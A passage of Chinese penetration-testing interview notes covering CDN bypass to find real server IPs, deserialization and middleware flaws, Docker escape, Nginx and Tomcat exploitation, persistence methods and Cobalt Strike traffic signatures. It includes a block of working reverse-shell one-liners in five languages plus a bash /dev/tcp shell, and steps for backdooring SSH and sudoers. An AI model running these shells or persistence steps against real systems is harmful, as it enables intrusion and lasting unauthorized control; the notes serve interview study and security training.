试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN.
nslookup http://example.com

方法3:
在线工具查看是否存在CDN，可以参考以下站点:
http://www.cdnplanet.com/tools/cdnfinder
http://www.ipip.net/ip.html

**绕过CDN查找网站真实IP**

**1.查询历史DNS记录(ip的历史解析域名，域名的历史解析ip)**
查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：
https://dnsdb.io/zh-cn/
https://x.threatbook.cn/
https://censys.io/ipv4?q=baidu.com
非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。
http://viewdns.info

同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。
http://securitytrails.com
https://site.ip138.com/

庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。
http://iphostinfo.com
注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。

**2.查询子域名**（捷径，去众测平台、github找官方发布过的）

注意：有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP
爆破子域名:
**主动式**
layer子域名挖掘机（字典要自己丰富）
http://z.zcjun.com/(在线子域名挖掘)
fuzzdomain 很好用，速度快
**被动式**
搜索引擎拿子域名、旁站（同IP网站）、C段：
可用搜索引擎语法查询子域名：
谷歌、百度、bing、搜狗(搜索微信文章)、雅虎等略有差异
详细用法:
（1）site: =主域名,搜索其主要域名下面的子域名
（2）allintext: = 搜索文本,但不包括网页标题和链接
（3）allinlinks: = 搜索链接, 不包括文本和标题。
（4）related:URL = 列出于目标URL地址有关的网页。
（5）link:URL = 列出到链接到目标URL的网页清单。
（6）使用“-”去掉不想看的结果，例如site:http://baidu.com http://-image.baidu.com
百度语法：
https://www.cnblogs.com/k0xx/p/12794452.html
谷歌语法：https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&utm_term=Googlehack&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&spm=1018.2118.3001.4187
GHDB：
https://www.exploit-db.com/google-hacking-database

**3.资产搜索(旁站\C段\特征):**

https://www.shodan.io(资产相关或特征值关键字爆ip)
https://fofa.so
https://www.zoomeye.org/
http://www.yunsee.cn/info.html （云悉在线资产平台)
http://subdomain.chaxun.la （查询啦）
https://www.virustotal.com/gui/home/search
https://dnsdumpster.com/
https://duckduckgo.com （一个不会存储你个人信息的搜索引擎）
https://crt.sh/（SSL证书查询）
https://icp.aizhan.com/(域名备案)
**4.对方服务器给自己发邮件暴露IP**

**5.APP客户端爆ip**

### 5.java反序列化的原理? java反序列化用到的函数

https://www.freebuf.com/vuls/270859.html

### 6.护网的溯源是怎样做的? shiro反序列化漏洞原理

溯源https://www.freebuf.com/articles/web/289450.html 

反弹shell：

```
1、Python版本： python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" 

2、Perl版本： perl -e 'use Socket;$i="192.168.10.13";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'  

3、PHP版本： php -r '$sock=fsockopen("192.168.10.13",8888);exec("/bin/sh -i <&3>&3 2>&3");'  

4、Ruby版本： ruby -rsocket -e'f=TCPSocket.open("192.168.10.13",8888).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'  

5、Java版本： r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.10.13/8888;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[]) p.waitFor()
```



```bash
bash -i >& /dev/tcp/ip/port 0>&1
```

### 7.中间人攻击原理讲一下

通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情

### 8.实战项目中令你最影响的漏洞

### 9.逻辑漏洞你怎么去找的

### 10.docker未授权访问漏洞了解过吗，讲一下? docker逃逸了解过吗?

1. Docker是以root权限运行的，这是所有姿势的前提

1. Docker在运行一个容器的时候可以将宿主机上的一个目录挂载到容器内的一个目录，我们可以参考redis未授权访问漏洞，将宿主机的/root/.ssh目录挂载到容器上，然后写入公钥。如果有web目录的话，最差也能上一个webshell。

1. 有些服务器不允许root登录，可以写入其他用户的.ssh/目录下（通过查看/etc/ssh/sshd_config目录），然后修改/etc/sudoer中的文件，配置为sudo免密码，切换为root

1. 还可以通过crontab写计划任务反弹shell

   docker逃逸：https://www.freebuf.com/articles/container/242763.html

### 11.struts2的漏洞你了解吗

https://www.freebuf.com/articles/web/320399.html

### 12.weblogic的漏洞你了解吗，讲一下

https://www.freebuf.com/vuls/284799.html

(中间件漏洞都了解一下吧， 资料包里有)

### 13.给一个struts2 的post, 碰到一个有waf的点怎么去做

### 14.上传webshell后发现函数被禁用掉了(执行whoami之类的命令执行不了==》linux服务器)

### 15.Nginx解析漏洞

Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项有什么用呢？看名字就知道是对文件路径进行“修理”。何谓“修理”？举个例子，当php遇到文件路径“/aaa.xxx/bbb.yyy/ccc.zzz”时，若“/aaa.xxx/bbb.yyy/ccc.zzz”不存在，则会去掉最后的“/ccc.zzz”，然后判断“/aaa.xxx/bbb.yyy”是否存在，若存在，则把“/aaa.xxx/bbb.yyy”当做文件“/aaa.xxx/bbb.yyy/ccc.zzz”，若“/aaa.xxx/bbb.yyy”仍不存在，则继续去掉“/bbb.yyy”，以此类推。

### Tomcat 远程代码执行

当存在该漏洞的Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT请求方法，攻击者可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行，抓包改方法为put，直接上传jsp

该漏洞的触发条件有两个，第一tomcat需要运行在Windows主机上，第二要启用PUT请求方法，复现该漏洞时，只需在conf/web.xml中添加

```
<init-param>
　<param-name>readonly</param-name>
　<param-value>false</param-value>
</init-param>
当resdonly的值为true时，是不开启PUT的方法的，当它为false时，则是开启PUT方法
```

### 权限维持

Windows：隐藏用户，黄金白银票据，上传正规厂家的远控软件，如GotoHTTP&RustDesk，木马自启动，等

Linux：修改ssh加入后门，如万能密码，记录密码，添加后门账号，cron定时执行任务，别名，添加rootkit后门



# 应急响应

## 挖矿病毒处理：

![img](http://image.daishen.ltd/i/2023/02/02/63db42741a146.png)



## CS流量特征

##### 01 stage下载

stager可执行文件`artifact.exe`运行后会有一个payload下载过程，使用http协议从指定服务器下载stage。其中http请求路径不唯一，但都符合一个checksum8规则，即：路径的ascii之和与256取余计算值等于92。比如`/Yle2`、`/cKTZ`、`/wQPD`

##### 02 beacon上线

随后beacon按设置的频率以`get`方法向c2服务器发起心跳请求，通过cookie携带靶机信息。

##### 03 命令下发

c2服务器如果有任务下发，则放入http心跳请求返回包中。

## 参考PDF-2020最新渗透测试面试题合集

https://www.freebuf.com/articles/web/252731.html

https://all.aqniu.com/
https://job.freebuf.com/
https://github.com/Mr-xn/BurpSuite-collections/
https://github.com/Yuusuke4/Pentest_Interview/